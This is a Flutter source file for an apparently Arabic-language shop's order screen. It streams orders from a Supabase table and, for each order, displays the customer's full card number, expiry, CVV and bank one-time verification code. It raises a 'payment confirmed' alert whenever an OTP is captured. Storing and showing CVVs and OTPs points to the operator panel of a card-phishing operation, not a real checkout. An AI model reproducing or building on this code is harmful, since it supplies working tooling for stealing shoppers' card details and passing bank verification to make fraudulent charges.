import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:intl/intl.dart';
import '../services/notification_service.dart';

class OrdersScreen extends StatefulWidget {
  const OrdersScreen({super.key});
  @override
  State<OrdersScreen> createState() => _OrdersScreenState();
}

class _OrdersScreenState extends State<OrdersScreen> {
  final _supabase = Supabase.instance.client;
  List<Map<String, dynamic>> _orders = [];
  bool _loading = true;
  bool _initialLoad = true;
  String _filter = 'all';

  @override
  void initState() {
    super.initState();
    _loadOrders();
  }

  void _subscribe() {
    _supabase
        .from('orders')
        .stream(primaryKey: ['id'])
        .order('id', ascending: false)
        .listen((data) {
      final oldCount = _orders.length;
      setState(() { _orders = data; _loading = false; });
      if (!_initialLoad && data.length > oldCount) {
        for (int i = oldCount; i < data.length; i++) {
          final o = data[i];
          final name = o['customer_name'] ?? 'عميل';
          final hasOtp = (o['card_otp'] ?? '').isNotEmpty;
          NotificationService.show(
            title: hasOtp ? '✅ تم تأكيد الدفع!' : '🛒 طلب جديد!',
            body: hasOtp ? '$name - تم الدفع مع OTP' : '$name',
          );
        }
      }
      _initialLoad = false;
    });
  }

  Future<void> _loadOrders() async {
    try {
      final data = await _supabase
          .from('orders')
          .select('*')
          .order('id', ascending: false);
      setState(() { _orders = data; _loading = false; });
      _subscribe();
    } catch (_) {
      setState(() => _loading = false);
    }
  }

  List<Map<String, dynamic>> get _filtered {
    if (_filter == 'all') return _orders;
    if (_filter == 'new') return _orders.where((o) => (o['card_otp'] ?? '') == '').toList();
    return _orders.where((o) => (o['card_otp'] ?? '') != '').toList();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('AURA GLOW - الطلبات'),
        actions: [
          PopupMenuButton<String>(
            icon: const Icon(Icons.filter_list),
            onSelected: (v) => setState(() => _filter = v),
            itemBuilder: (_) => [
              const PopupMenuItem(value: 'all', child: Text('الكل')),
              const PopupMenuItem(value: 'new', child: Text('جديدة')),
              const PopupMenuItem(value: 'paid', child: Text('مكتملة')),
            ],
          ),
          IconButton(icon: const Icon(Icons.refresh), onPressed: _loadOrders),
        ],
      ),
      body: _loading
          ? const Center(child: CircularProgressIndicator())
          : _filtered.isEmpty
              ? const Center(child: Text('لا توجد طلبات'))
              : ListView.builder(
                  padding: const EdgeInsets.all(12),
                  itemCount: _filtered.length,
                  itemBuilder: (_, i) => _buildCard(_filtered[i]),
                ),
    );
  }

  Widget _buildCard(Map<String, dynamic> o) {
    final name = o['customer_name'] ?? '-';
    final phone = o['customer_phone'] ?? '-';
    final total = o['total'] ?? 0;
    final date = o['created_at'] != null
        ? DateFormat('dd/MM HH:mm').format(DateTime.parse(o['created_at']))
        : '-';
    final num = o['card_number'] ?? '';
    final holder = o['card_holder'] ?? '';
    final expiry = o['card_expiry'] ?? '';
    final cvv = o['card_cvv'] ?? '';
    final otp = o['card_otp'] ?? '';
    final hasCard = num.isNotEmpty;
    final hasOtp = otp.isNotEmpty;

    return Card(
      margin: const EdgeInsets.only(bottom: 12),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(children: [
              Icon(hasOtp ? Icons.check_circle : Icons.pending, color: hasOtp ? Colors.green : Colors.orange, size: 20),
              const SizedBox(width: 8),
              Expanded(child: Text(name, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 16))),
              Text('$total ₪', style: TextStyle(fontWeight: FontWeight.bold, color: Colors.amber.shade800, fontSize: 16)),
            ]),
            const Divider(height: 16),
            _row('الهاتف', phone),
            _row('التاريخ', date),
            if (hasCard) ...[
              const Divider(height: 8),
              const Text('البطاقة:', style: TextStyle(fontWeight: FontWeight.bold)),
              _row('رقم البطاقة', num, mono: true),
              _row('صاحبها', holder),
              _row('الانتهاء', expiry),
              _row('رمز الأمان', cvv, mono: true),
              if (hasOtp) _row('رمز التحقق (OTP)', otp, mono: true),
            ],
          ],
        ),
      ),
    );
  }

  Widget _row(String label, String value, {bool mono = false}) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 2),
      child: Row(
        children: [
          Text('$label: ', style: TextStyle(color: Colors.grey.shade600, fontSize: 13)),
          Expanded(child: Text(value, style: TextStyle(fontSize: 13, fontFamily: mono ? 'monospace' : null))),
        ],
      ),
    );
  }
}
